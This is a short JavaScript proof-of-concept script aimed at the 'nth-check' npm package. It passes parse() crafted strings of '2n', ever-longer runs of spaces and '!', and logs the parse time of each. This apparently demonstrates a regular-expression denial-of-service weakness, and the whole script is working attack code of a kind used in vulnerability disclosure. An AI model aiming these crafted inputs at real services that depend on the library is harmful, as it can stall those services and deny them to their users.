// PoC.js
var nthCheck = require("nth-check");
for (var i = 1; i <= 50000; i++) {
  var time = Date.now();
  var attack_str = "2n" + " ".repeat(i * 10000) + "!";
  try {
    nthCheck.parse(attack_str);
  } catch (err) {
    var time_cost = Date.now() - time;
    console.log(
      "attack_str.length: " + attack_str.length + ": " + time_cost + " ms"
    );
  }
}
